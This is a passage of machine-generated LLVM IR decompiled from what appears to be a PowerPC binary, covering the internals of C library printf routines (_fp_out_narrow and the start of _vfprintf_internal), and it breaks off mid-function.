  br i1 %v3_1001a4784, label %dec_label_pc_1001a498, label %dec_label_pc_1001a48c

dec_label_pc_1001a474:                            ; preds = %dec_label_pc_1001a48c
  %v1_1001a474 = add i32 %v0_1001a474, -1
  store i32 %v1_1001a474, i32* @r31, align 4
  %v3_1001a478 = icmp eq i32 %v1_1001a474, 0
  %v0_1001a484 = load i32, i32* @r29, align 4
  br i1 %v3_1001a478, label %dec_label_pc_1001a498.loopexit, label %dec_label_pc_1001a48c

dec_label_pc_1001a48c:                            ; preds = %entry, %dec_label_pc_1001a474
  %v0_1001a4846 = phi i32 [ %v0_1001a484, %dec_label_pc_1001a474 ], [ %arg1, %entry ]
  store i32 268543120, i32* @lr, align 4
  %v3_1001a48c = inttoptr i32 %v0_1001a4846 to i16*
  %v4_1001a48c = call i32 @__stdio_fwrite(i32 %v2_1001a47c, i32 1, i16* %v3_1001a48c)
  %v3_1001a490 = icmp eq i32 %v4_1001a48c, 1
  %v0_1001a474 = load i32, i32* @r31, align 4
  br i1 %v3_1001a490, label %dec_label_pc_1001a474, label %dec_label_pc_1001a498.loopexit

dec_label_pc_1001a498.loopexit:                   ; preds = %dec_label_pc_1001a474, %dec_label_pc_1001a48c
  %v0_1001a49c.ph = phi i32 [ %v0_1001a474, %dec_label_pc_1001a48c ], [ 0, %dec_label_pc_1001a474 ]
  %v1_1001a49c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001a498

dec_label_pc_1001a498:                            ; preds = %dec_label_pc_1001a498.loopexit, %entry
  %v1_1001a49c = phi i32 [ 0, %entry ], [ %v1_1001a49c.pre, %dec_label_pc_1001a498.loopexit ]
  %v0_1001a49c = phi i32 [ 0, %entry ], [ %v0_1001a49c.ph, %dec_label_pc_1001a498.loopexit ]
  %v2_1001a49c = sub i32 %v1_1001a49c, %v0_1001a49c
  ret i32 %v2_1001a49c

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1001a498.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_1001a48c, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %v1_1001a4bc = and i32 %arg2, 128
  %v3_1001a4bc = icmp eq i32 %v1_1001a4bc, 0
  store i32 %arg1, i32* %r26.global-to-local, align 4
  store i32 %arg2, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r27, align 4
  store i32 %arg4, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  br i1 %v3_1001a4bc, label %dec_label_pc_1001a514, label %dec_label_pc_1001a4e0

dec_label_pc_1001a4e0:                            ; preds = %entry
  %v0_1001a4e0 = call i32 @__GI_strlen()
  %v0_1001a4e4 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1001a4e0, i32* @r31, align 4
  %v0_1001a4ec = load i32, i32* %r26.global-to-local, align 4
  %v1_1001a4f0 = load i32, i32* %r30.global-to-local, align 4
  %v2_1001a4f0 = sub i32 %v1_1001a4f0, %v0_1001a4e0
  store i32 %v2_1001a4f0, i32* %r29.global-to-local, align 4
  store i32 %v0_1001a4e0, i32* %r30.global-to-local, align 4
  %tmp7 = icmp slt i32 %v2_1001a4f0, 1
  br i1 %tmp7, label %dec_label_pc_1001a514, label %dec_label_pc_1001a500

dec_label_pc_1001a500:                            ; preds = %dec_label_pc_1001a4e0
  %v1_1001a4e4 = urem i32 %v0_1001a4e4, 128
  store i32 268543236, i32* @lr, align 4
  %v3_1001a500 = trunc i32 %v1_1001a4e4 to i8
  %v4_1001a500 = call i32 @_charpad(i32 %v0_1001a4ec, i8 %v3_1001a500, i32 %v2_1001a4f0)
  %v0_1001a504 = load i32, i32* @r31, align 4
  store i32 %v0_1001a504, i32* %r30.global-to-local, align 4
  %v1_1001a508 = load i32, i32* @r29, align 4
  %v4_1001a508 = icmp eq i32 %v4_1001a500, %v1_1001a508
  store i32 %v4_1001a500, i32* @r28, align 4
  br i1 %v4_1001a508, label %dec_label_pc_1001a500.dec_label_pc_1001a514_crit_edge, label %dec_label_pc_1001a538

dec_label_pc_1001a500.dec_label_pc_1001a514_crit_edge: ; preds = %dec_label_pc_1001a500
  %v0_1001a520.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_1001a514

dec_label_pc_1001a514:                            ; preds = %dec_label_pc_1001a500.dec_label_pc_1001a514_crit_edge, %dec_label_pc_1001a4e0, %entry
  %v0_1001a520 = phi i32 [ %v0_1001a520.pre, %dec_label_pc_1001a500.dec_label_pc_1001a514_crit_edge ], [ %v0_1001a4ec, %dec_label_pc_1001a4e0 ], [ %arg1, %entry ]
  %v0_1001a51c = phi i32 [ %v0_1001a504, %dec_label_pc_1001a500.dec_label_pc_1001a514_crit_edge ], [ %v0_1001a4e0, %dec_label_pc_1001a4e0 ], [ %arg3, %entry ]
  %tmp8 = icmp slt i32 %v0_1001a51c, 1
  br i1 %tmp8, label %dec_label_pc_1001a534, label %dec_label_pc_1001a52c

dec_label_pc_1001a52c:                            ; preds = %dec_label_pc_1001a514
  %v0_1001a518 = load i32, i32* @r27, align 4
  store i32 268543280, i32* @lr, align 4
  %v3_1001a52c = inttoptr i32 %v0_1001a520 to i16*
  %v4_1001a52c = call i32 @__stdio_fwrite(i32 %v0_1001a518, i32 %v0_1001a51c, i16* %v3_1001a52c)
  br label %dec_label_pc_1001a534

dec_label_pc_1001a534:                            ; preds = %dec_label_pc_1001a514, %dec_label_pc_1001a52c
  %v1_1001a534 = phi i32 [ 0, %dec_label_pc_1001a514 ], [ %v4_1001a52c, %dec_label_pc_1001a52c ]
  %v0_1001a534 = load i32, i32* @r28, align 4
  %v2_1001a534 = add i32 %v0_1001a534, %v1_1001a534
  br label %dec_label_pc_1001a538

dec_label_pc_1001a538:                            ; preds = %dec_label_pc_1001a500, %dec_label_pc_1001a534
  %v0_1001a53c = phi i32 [ %v4_1001a500, %dec_label_pc_1001a500 ], [ %v2_1001a534, %dec_label_pc_1001a534 ]
  ret i32 %v0_1001a53c

; uselistorder directives
  uselistorder i32 %v0_1001a51c, { 1, 0 }
  uselistorder i32 %v2_1001a4f0, { 1, 0, 2 }
  uselistorder i32* %r26.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_1001a538, { 1, 0 }
  uselistorder label %dec_label_pc_1001a534, { 1, 0 }
}

define i32 @_vfprintf_internal() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp55 = call i8 @__decompiler_undefined_function_4()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp58 = call i32 @__decompiler_undefined_function_0()
  %tmp59 = call i8 @__decompiler_undefined_function_4()
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-201 = alloca i32, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-200 = alloca i8*, align 4
  %v0_1001a554 = load i32, i32* @lr, align 4
  store i32 %v0_1001a554, i32* %r0.global-to-local, align 4
  %v2_1001a55c = ptrtoint i8** %stack_var_-200 to i32
  store i32 %v2_1001a55c, i32* %r30.global-to-local, align 4
  %v0_1001a560 = load i32, i32* @r3, align 4
  store i32 %v0_1001a560, i32* @r24, align 4
  %v0_1001a56c = load i32, i32* @r5, align 4
  store i32 %v0_1001a56c, i32* %r31.global-to-local, align 4
  %v0_1001a570 = load i32, i32* @r4, align 4
  store i32 %v0_1001a570, i32* @r29, align 4
  store i32 268543352, i32* @lr, align 4
  %v1_1001a574 = bitcast i8** %stack_var_-200 to i32*
  %v2_1001a574 = call i32 @_ppfs_init(i32* %v1_1001a574)
  %tmp72 = icmp sgt i32 %v2_1001a574, -1
  br i1 %tmp72, label %dec_label_pc_1001a5a8, label %dec_label_pc_1001a580

dec_label_pc_1001a580:                            ; preds = %entry
  %v3_1001a580 = load i8*, i8** %stack_var_-200, align 4
  %v4_1001a580 = ptrtoint i8* %v3_1001a580 to i32
  store i32 %v4_1001a580, i32* @r31, align 4
  store i32 -1, i32* %r23.global-to-local, align 4
  store i32 %v4_1001a580, i32* @r3, align 4
  %v0_1001a58c = call i32 @__GI_strlen()
  %v3_1001a590 = icmp eq i32 %v0_1001a58c, 0
  br i1 %v3_1001a590, label %dec_label_pc_1001aba0, label %dec_label_pc_1001a598

dec_label_pc_1001a598:                            ; preds = %dec_label_pc_1001a580
  %v0_1001a598 = load i32, i32* @r31, align 4
  %v0_1001a59c = load i32, i32* @r24, align 4
  store i32 ptrtoint (i32* @global_var_1001a5a4.1159 to i32), i32* @lr, align 4
  %v3_1001a5a0 = inttoptr i32 %v0_1001a59c to i16*
  %v4_1001a5a0 = call i32 @__stdio_fwrite(i32 %v0_1001a598, i32 %v0_1001a58c, i16* %v3_1001a5a0)
  br label %dec_label_pc_1001aba0

dec_label_pc_1001a5a8:                            ; preds = %entry
  %v0_1001a5ac = load i32, i32* @r31, align 4
  store i32 268543412, i32* @lr, align 4
  %v2_1001a5b0 = call i32 @_ppfs_prepargs(i32 %v2_1001a55c, i32 %v0_1001a5ac)
  store i32 0, i32* %r23.global-to-local, align 4
  %v2_1001a648 = ptrtoint i32* %stack_var_-112 to i32
  %v4_1001a64c = zext i8 %tmp59 to i32
  %tmp73 = icmp slt i32 %tmp60, 1
  %v2_1001a670 = ptrtoint i32* %stack_var_-344 to i32
  %v3_1001a674 = icmp eq i32 %tmp58, 0
  %tmp74 = icmp sgt i32 %tmp58, -1
  %v3_1001a6a8 = icmp eq i32 %tmp57, 0
  %v2_1001aa00 = ptrtoint i32* %stack_var_-328 to i32
  %v2_1001a920 = ptrtoint i32* %stack_var_-340 to i32
  %v2_1001a924 = ptrtoint i32* %stack_var_-336 to i32
  %v5_1001a798 = bitcast i32* %stack_var_-201 to i8*
  %tmp75 = icmp ult i32 %tmp57, 6
  %v3_1001a874 = icmp eq i32 %tmp57, 1
  %v2_1001a818 = icmp ugt i32 %tmp57, 2
  %v4_1001a758 = zext i8 %tmp55 to i32
  %v0_1001ab8c.pre = load i32, i32* @r29, align 4
  %v1_1001a678 = add i32 %tmp58, 1
  %v2_1001a6d0 = icmp ugt i32 %tmp57, 7
  %v2_1001a8ac = icmp ugt i32 %tmp57, 15
  %v2_1001a8e0 = icmp ugt i32 %tmp57, 17
  %v3_1001a8e0 = icmp eq i32 %tmp57, 17
  %v2_1001a988 = icmp ugt i32 %tmp57, 19
  %v3_1001a988 = icmp eq i32 %tmp57, 19
  %v3_1001a9f4 = icmp eq i32 %tmp57, 20
  %v1_1001a6e8 = add i32 %tmp57, add (i32 ptrtoint (i32* @global_var_1002e414.1161 to i32), i32 -1)
  %v2_1001a6e8 = inttoptr i32 %v1_1001a6e8 to i8*
  %v3_1001a824 = icmp eq i32 %tmp57, 3
  %v3_1001a834 = icmp eq i32 %tmp57, 4
  %v1_1001a65c = mul nuw nsw i32 %v4_1001a64c, 8
  %v2_1001a660 = add i32 %v2_1001a648, %v1_1001a65c
  %v1_1001a664 = add i32 %v2_1001a660, -8
  br label %dec_label_pc_1001ab8c

dec_label_pc_1001a5c0.backedge:                   ; preds = %dec_label_pc_1001a614, %dec_label_pc_1001a5cc
  %storemerge12.in = phi i32 [ %v1_1001a5dc, %dec_label_pc_1001a5cc ], [ %v1_1001a614, %dec_label_pc_1001a614 ]
  %v1_1001a5d415 = phi i32 [ %v0_1001a5ec, %dec_label_pc_1001a5cc ], [ %v1_1001a614, %dec_label_pc_1001a614 ]
  %storemerge12 = add i32 %storemerge12.in, 1
  store i32 %storemerge12, i32* @r29, align 4
  br label %dec_label_pc_1001a5c0

dec_label_pc_1001a5c0:                            ; preds = %dec_label_pc_1001a5c0.backedge, %dec_label_pc_1001ab8c
  %v0_1001a5ec = phi i32 [ %v1_1001a5d415, %dec_label_pc_1001a5c0.backedge ], [ %v0_1001ab8c, %dec_label_pc_1001ab8c ]
  %v1_1001a5dc = phi i32 [ %storemerge12, %dec_label_pc_1001a5c0.backedge ], [ %v0_1001ab8c, %dec_label_pc_1001ab8c ]
  %v1_1001a5c0 = inttoptr i32 %v1_1001a5dc to i8*
  %v2_1001a5c0 = load i8, i8* %v1_1001a5c0, align 1
  %v3_1001a5c0 = zext i8 %v2_1001a5c0 to i32
  store i32 %v3_1001a5c0, i32* %r0.global-to-local, align 4
  %v3_1001a5c4 = icmp eq i8 %v2_1001a5c0, 0
  br i1 %v3_1001a5c4, label %dec_label_pc_1001a5d4, label %dec_label_pc_1001a5cc

dec_label_pc_1001a5cc:                            ; preds = %dec_label_pc_1001a5c0
  %v3_1001a5cc = icmp eq i8 %v2_1001a5c0, 37
  br i1 %v3_1001a5cc, label %dec_label_pc_1001a5d4, label %dec_label_pc_1001a5c0.backedge

dec_label_pc_1001a5d4:                            ; preds = %dec_label_pc_1001a5cc, %dec_label_pc_1001a5c0
  %v4_1001a5d4 = icmp eq i32 %v1_1001a5dc, %v0_1001a5ec
  br i1 %v4_1001a5d4, label %dec_label_pc_1001a608, label %dec_label_pc_1001a5dc

dec_label_pc_1001a5dc:                            ; preds = %dec_label_pc_1001a5d4
  %v2_1001a5dc = sub i32 %v1_1001a5dc, %v0_1001a5ec
  store i32 %v2_1001a5dc, i32* @r31, align 4
  %v4_1001a5dc = icmp sgt i32 %v2_1001a5dc, 0
  br i1 %v4_1001a5dc, label %dec_label_pc_1001a5ec, label %dec_label_pc_1001a5fc

dec_label_pc_1001a5ec:                            ; preds = %dec_label_pc_1001a5dc
  %v0_1001a5f4 = load i32, i32* @r24, align 4
  store i32 268543484, i32* @lr, align 4
  %v3_1001a5f8 = inttoptr i32 %v0_1001a5f4 to i16*
  %v4_1001a5f8 = call i32 @__stdio_fwrite(i32 %v0_1001a5ec, i32 %v2_1001a5dc, i16* %v3_1001a5f8)
  %v1_1001a5fc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001a5fc

dec_label_pc_1001a5fc:                            ; preds = %dec_label_pc_1001a5dc, %dec_label_pc_1001a5ec
  %v1_1001a604 = phi i32 [ %v1_1001a5fc.pre, %dec_label_pc_1001a5ec ], [ %v2_1001a5dc, %dec_label_pc_1001a5dc ]
  %storemerge = phi i32 [ %v4_1001a5f8, %dec_label_pc_1001a5ec ], [ 0, %dec_label_pc_1001a5dc ]
  %v4_1001a5fc = icmp eq i32 %storemerge, %v1_1001a604
  br i1 %v4_1001a5fc, label %dec_label_pc_1001a604, label %dec_label_pc_1001ab9c

dec_label_pc_1001a604:                            ; preds = %dec_label_pc_1001a5fc
  %v0_1001a604 = load i32, i32* %r23.global-to-local, align 4
  %v2_1001a604 = add i32 %v0_1001a604, %v1_1001a604
  store i32 %v2_1001a604, i32* %r23.global-to-local, align 4
  %v0_1001a608.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001a608

dec_label_pc_1001a608:                            ; preds = %dec_label_pc_1001a5d4, %dec_label_pc_1001a604
  %v0_1001a614 = phi i32 [ %v0_1001a5ec, %dec_label_pc_1001a5d4 ], [ %v0_1001a608.pre, %dec_label_pc_1001a604 ]
  %v1_1001a608 = inttoptr i32 %v0_1001a614 to i8*
  %v2_1001a608 = load i8, i8* %v1_1001a608, align 1
  %v3_1001a608 = zext i8 %v2_1001a608 to i32
  store i32 %v3_1001a608, i32* %r0.global-to-local, align 4
  %v3_1001a60c = icmp eq i8 %v2_1001a608, 0
  br i1 %v3_1001a60c, label %dec_label_pc_1001aba0, label %dec_label_pc_1001a614

dec_label_pc_1001a614:                            ; preds = %dec_label_pc_1001a608
  %v1_1001a614 = add i32 %v0_1001a614, 1
  %v2_1001a614 = inttoptr i32 %v1_1001a614 to i8*
  %v3_1001a614 = load i8, i8* %v2_1001a614, align 1
  %v4_1001a614 = zext i8 %v3_1001a614 to i32
  store i32 %v4_1001a614, i32* %r0.global-to-local, align 4
  %v3_1001a61c = icmp eq i8 %v3_1001a614, 37
  br i1 %v3_1001a61c, label %dec_label_pc_1001a5c0.backedge, label %dec_label_pc_1001a624

dec_label_pc_1001a624:                            ; preds = %dec_label_pc_1001a614
  store i32 %v2_1001a55c, i32* @r29, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-340, align 4
  store i8* %v2_1001a614, i8** %stack_var_-200, align 4
  store i32 268543548, i32* @lr, align 4
  %v3_1001a638 = call i32 @_ppfs_parsespec(i32* %v1_1001a574, i32 %v1_1001a614)
  store i32 %v2_1001a55c, i32* @r3, align 4
  store i32 268543556, i32* @lr, align 4
  %v0_1001a640 = call i32 @_ppfs_setargs()
  store i32 %tmp60, i32* %r0.global-to-local, align 4
  store i32 %v2_1001a648, i32* %r11.global-to-local, align 4
  store i32 %v4_1001a64c, i32* %r7.global-to-local, align 4
  br i1 %tmp73, label %dec_label_pc_1001a668, label %dec_label_pc_1001a65c

dec_label_pc_1001a65c:                            ; preds = %dec_label_pc_1001a624
  br label %dec_label_pc_1001a668

dec_label_pc_1001a668:                            ; preds = %dec_label_pc_1001a624, %dec_label_pc_1001a65c
  %storemerge94 = phi i32 [ %v1_1001a664, %dec_label_pc_1001a65c ], [ %v2_1001a648, %dec_label_pc_1001a624 ]
  %v0_1001a69483 = phi i32 [ %v1_1001a664, %dec_label_pc_1001a65c ], [ %v2_1001a648, %dec_label_pc_1001a624 ]
  store i32 %storemerge94, i32* @r10, align 4
  store i32 %v2_1001a670, i32* @r8, align 4
  store i32 %v1_1001a678, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  br i1 %tmp74, label %dec_label_pc_1001a698.preheader, label %dec_label_pc_1001a698.preheader.thread

dec_label_pc_1001a698.preheader.thread:           ; preds = %dec_label_pc_1001a668
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001a6a4

dec_label_pc_1001a698.preheader:                  ; preds = %dec_label_pc_1001a668
  store i32 %tmp58, i32* %ctr.global-to-local, align 4
  br i1 %v3_1001a674, label %dec_label_pc_1001a6a4, label %dec_label_pc_1001a690.preheader

dec_label_pc_1001a690.preheader:                  ; preds = %dec_label_pc_1001a698.preheader
  store i32 %v0_1001a69483, i32* %stack_var_-344, align 4
  %v1_1001a69484 = add i32 %v0_1001a69483, 8
  store i32 %v1_1001a69484, i32* @r10, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r11.global-to-local, align 4
  %v1_1001a6a089 = add i32 %tmp58, -1
  store i32 %v1_1001a6a089, i32* %ctr.global-to-local, align 4
  %v2_1001a6a090 = icmp eq i32 %v1_1001a6a089, 0
  br i1 %v2_1001a6a090, label %dec_label_pc_1001a6a4, label %dec_label_pc_1001a690.dec_label_pc_1001a690_crit_edge

dec_label_pc_1001a690.dec_label_pc_1001a690_crit_edge: ; preds = %dec_label_pc_1001a690.preheader, %dec_label_pc_1001a690.dec_label_pc_1001a690_crit_edge.dec_label_pc_1001a690.dec_label_pc_1001a690_crit_edge_crit_edge
  %v1_1001a690.pre = phi i32 [ %v1_1001a690.pre.pre, %dec_label_pc_1001a690.dec_label_pc_1001a690_crit_edge.dec_label_pc_1001a690.dec_label_pc_1001a690_crit_edge_crit_edge ], [ %v2_1001a670, %dec_label_pc_1001a690.preheader ]
  %v1_1001a69892 = phi i32 [ %v1_1001a698, %dec_label_pc_1001a690.dec_label_pc_1001a690_crit_edge.dec_label_pc_1001a690.dec_label_pc_1001a690_crit_edge_crit_edge ], [ 4, %dec_label_pc_1001a690.preheader ]
  %v1_1001a69491 = phi i32 [ %v1_1001a694, %dec_label_pc_1001a690.dec_label_pc_1001a690_crit_edge.dec_label_pc_1001a690.dec_label_pc_1001a690_crit_edge_crit_edge ], [ %v1_1001a69484, %dec_label_pc_1001a690.preheader ]
  %v3_1001a690 = add i32 %v1_1001a690.pre, %v1_1001a69892
  %v4_1001a690 = inttoptr i32 %v3_1001a690 to i32*
  store i32 %v1_1001a69491, i32* %v4_1001a690, align 4
  %v0_1001a694 = load i32, i32* @r10, align 4
  %v1_1001a694 = add i32 %v0_1001a694, 8
  store i32 %v1_1001a694, i32* @r10, align 4
  %v0_1001a698 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001a698 = mul i32 %v0_1001a698, 4
  store i32 %v1_1001a698, i32* %r0.global-to-local, align 4
  %v1_1001a69c = add i32 %v0_1001a698, 1
  store i32 %v1_1001a69c, i32* %r11.global-to-local, align 4
  %v0_1001a6a0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001a6a0 = add i32 %v0_1001a6a0, -1
  store i32 %v1_1001a6a0, i32* %ctr.global-to-local, align 4
  %v2_1001a6a0 = icmp eq i32 %v1_1001a6a0, 0
  br i1 %v2_1001a6a0, label %dec_label_pc_1001a6a4, label %dec_label_pc_1001a690.dec_label_pc_1001a690_crit_edge.dec_label_pc_1001a690.dec_label_pc_1001a690_crit_edge_crit_edge

dec_label_pc_1001a690.dec_label_pc_1001a690_crit_edge.dec_label_pc_1001a690.dec_label_pc_1001a690_crit_edge_crit_edge: ; preds = %dec_label_pc_1001a690.dec_label_pc_1001a690_crit_edge
  %v1_1001a690.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1001a690.dec_label_pc_1001a690_crit_edge

dec_label_pc_1001a6a4:                            ; preds = %dec_label_pc_1001a690.preheader, %dec_label_pc_1001a690.dec_label_pc_1001a690_crit_edge, %dec_label_pc_1001a698.preheader.thread, %dec_label_pc_1001a698.preheader
  store i32 %tmp57, i32* @r11, align 4
  br i1 %v3_1001a6a8, label %dec_label_pc_1001a6b0, label %dec_label_pc_1001a6d0

dec_label_pc_1001a6b0:                            ; preds = %dec_label_pc_1001a6a4
  %v0_1001a6b4 = load i32, i32* %r23.global-to-local, align 4
  store i32 %v0_1001a6b4, i32* @r6, align 4
  %tmp99 = icmp slt i32 %v0_1001a6b4, 0
  %v1_1001a6bc = zext i1 %tmp99 to i32
  %v2_1001a6bc = ashr i32 %v0_1001a6b4, 31
  %v3_1001a6bc = and i32 %v2_1001a6bc, -2
  %v4_1001a6bc = or i32 %v3_1001a6bc, %v1_1001a6bc
  store i32 %v4_1001a6bc, i32* @r5, align 4
  %v1_1001a6c4 = call i32 @__asm_rlwinm(i32 %v0_1001a7e0, i32 0, i32 20, i32 23)
  store i32 %v1_1001a6c4, i32* @r4, align 4
  %v1_1001a6c8 = inttoptr i32 %v1_1001a6c4 to i16*
  %v2_1001a6c8 = call i32 @_store_inttype(i16* %v1_1001a6c8)
  br label %dec_label_pc_1001ab88

dec_label_pc_1001a6d0:                            ; preds = %dec_label_pc_1001a6a4
  br i1 %v2_1001a6d0, label %dec_label_pc_1001a8ac, label %dec_label_pc_1001a6d8

dec_label_pc_1001a6d8:                            ; preds = %dec_label_pc_1001a6d0
  store i32 87, i32* %r31.global-to-local, align 4
  %v3_1001a6e8 = load i8, i8* %v2_1001a6e8, align 1
  %v4_1001a6e8 = zext i8 %v3_1001a6e8 to i32
  store i32 %v4_1001a6e8, i32* %r30.global-to-local, align 4
  %v3_1001a6ec = icmp eq i8 %v3_1001a6e8, 10
  br i1 %v3_1001a6ec, label %dec_label_pc_1001a6f4, label %dec_label_pc_1001a718

dec_label_pc_1001a6f4:                            ; preds = %dec_label_pc_1001a6d8
  store i32 %v0_1001a7e0, i32* %r0.global-to-local, align 4
  %v1_1001a6f8 = call i32 @__asm_rlwinm(i32 %v0_1001a7e0, i32 27, i32 31, i32 31)
  %v2_1001a6fc = icmp ne i32 %v1_1001a6f8, 0
  %v1_1001a708 = and i32 %v0_1001a7e0, 64
  %v3_1001a708 = icmp eq i32 %v1_1001a708, 0
  %v1_1001a70c = select i1 %v2_1001a6fc, i32 44, i32 87
  store i32 %v1_1001a70c, i32* %r31.global-to-local, align 4
  br i1 %v3_1001a708, label %dec_label_pc_1001a718, label %dec_label_pc_1001a714

dec_label_pc_1001a714:                            ; preds = %dec_label_pc_1001a6f4
  %v1_1001a714 = or i32 %v1_1001a70c, 128
  store i32 %v1_1001a714, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001a718

dec_label_pc_1001a718:                            ; preds = %dec_label_pc_1001a6d8, %dec_label_pc_1001a6f4, %dec_label_pc_1001a714
  %v0_1001a718 = load i32, i32* @r11, align 4
  %v2_1001a718 = icmp ugt i32 %v0_1001a718, 5
  br i1 %v2_1001a718, label %dec_label_pc_1001a740, label %dec_label_pc_1001a720

dec_label_pc_1001a720:                            ; preds = %dec_label_pc_1001a718
  %v3_1001a720 = icmp eq i32 %v0_1001a718, 3
  br i1 %v3_1001a720, label %dec_label_pc_1001a728, label %dec_label_pc_1001a730

dec_label_pc_1001a728:                            ; preds = %dec_label_pc_1001a720
  store i32 55, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1001a744

dec_label_pc_1001a730:                            ; preds = %dec_label_pc_1001a720
  %v3_1001a730 = icmp eq i32 %v0_1001a718, 1
  br i1 %v3_1001a730, label %dec_label_pc_1001a748, label %dec_label_pc_1001a744

dec_label_pc_1001a740:                            ; preds = %dec_label_pc_1001a718
  %v0_1001a740 = load i32, i32* %r30.global-to-local, align 4
  %v1_1001a740 = sub i32 0, %v0_1001a740
  store i32 %v1_1001a740, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001a744

dec_label_pc_1001a744:                            ; preds = %dec_label_pc_1001a730, %dec_label_pc_1001a728, %dec_label_pc_1001a740
  br label %dec_label_pc_1001a748

dec_label_pc_1001a748:                            ; preds = %dec_label_pc_1001a730, %dec_label_pc_1001a744
  %storemerge2 = phi i32 [ 11, %dec_label_pc_1001a744 ], [ 6, %dec_label_pc_1001a730 ]
  store i32 %storemerge2, i32* @r27, align 4
  %v3_1001a748 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_1001a748, i32* %r0.global-to-local, align 4
  %tmp76 = icmp sgt i32 %v3_1001a748, -1
  br i1 %tmp76, label %dec_label_pc_1001a75c, label %dec_label_pc_1001a758

dec_label_pc_1001a758:                            ; preds = %dec_label_pc_1001a748
  br label %dec_label_pc_1001a75c

dec_label_pc_1001a75c:                            ; preds = %dec_label_pc_1001a748, %dec_label_pc_1001a758
  %storemerge95 = phi i32 [ %v4_1001a758, %dec_label_pc_1001a758 ], [ 32, %dec_label_pc_1001a748 ]
  store i32 %storemerge95, i32* @r26, align 4
  %v3_1001a75c = icmp eq i32 %v0_1001a718, 1
  br i1 %v3_1001a75c, label %dec_label_pc_1001a778, label %dec_label_pc_1001a768

dec_label_pc_1001a768:                            ; preds = %dec_label_pc_1001a75c
  %v0_1001a768 = load i32, i32* %r7.global-to-local, align 4
  %v1_1001a768 = mul i32 %v0_1001a768, 4
  store i32 %v1_1001a768, i32* %r0.global-to-local, align 4
  %v0_1001a76c = load i32, i32* @r1, align 4
  %v2_1001a76c = add i32 %v0_1001a76c, %v1_1001a768
  %v1_1001a770 = add i32 %v2_1001a76c, 188
  %v2_1001a770 = inttoptr i32 %v1_1001a770 to i32*
  %v3_1001a770 = load i32, i32* %v2_1001a770, align 4
  store i32 %v3_1001a770, i32* %r0.global-to-local, align 4
  %v1_1001a774 = call i32 @__asm_rlwinm(i32 %v3_1001a770, i32 0, i32 20, i32 23)
  br label %dec_label_pc_1001a778

dec_label_pc_1001a778:                            ; preds = %dec_label_pc_1001a75c, %dec_label_pc_1001a768
  %v3_1001a778 = load i32, i32* %stack_var_-344, align 4
  %v0_1001a77c = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1001a77c, i32* @r5, align 4
  %v2_1001a780 = inttoptr i32 %v0_1001a77c to i32*
  %v3_1001a780 = call i32 @_load_inttype(i32 %v3_1001a778, i32* %v2_1001a780)
  store i32 %v0_1001a77c, i32* %r7.global-to-local, align 4
  %v0_1001a790 = load i32, i32* %r31.global-to-local, align 4
  %v6_1001a798 = call i32 @_uintmaxtostr(i8* %v5_1001a798, i32 %v3_1001a780, i32 %v3_1001a778, i32 %v0_1001a77c, i32 %v0_1001a790)
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  store i32 %v6_1001a798, i32* %r30.global-to-local, align 4
  br i1 %tmp75, label %dec_label_pc_1001a7ec, label %dec_label_pc_1001a7ac

dec_label_pc_1001a7ac:                            ; preds = %dec_label_pc_1001a778
  %v7_1001a798 = inttoptr i32 %v6_1001a798 to i8*
  %v3_1001a7ac = load i8, i8* %v7_1001a798, align 1
  %v4_1001a7ac = zext i8 %v3_1001a7ac to i32
  store i32 %v4_1001a7ac, i32* %r0.global-to-local, align 4
  %v3_1001a7b4 = icmp eq i8 %v3_1001a7ac, 45
  br i1 %v3_1001a7b4, label %dec_label_pc_1001a7bc, label %dec_label_pc_1001a7d0

dec_label_pc_1001a7bc:                            ; preds = %dec_label_pc_1001a7ac
  %v1_1001a7bc = or i32 %v0_1001a7e0, 2
  store i32 %v1_1001a7bc, i32* %r0.global-to-local, align 4
  %v2_1001a7c0 = add i32 %v6_1001a798, 1
  store i32 %v2_1001a7c0, i32* %r30.global-to-local, align 4
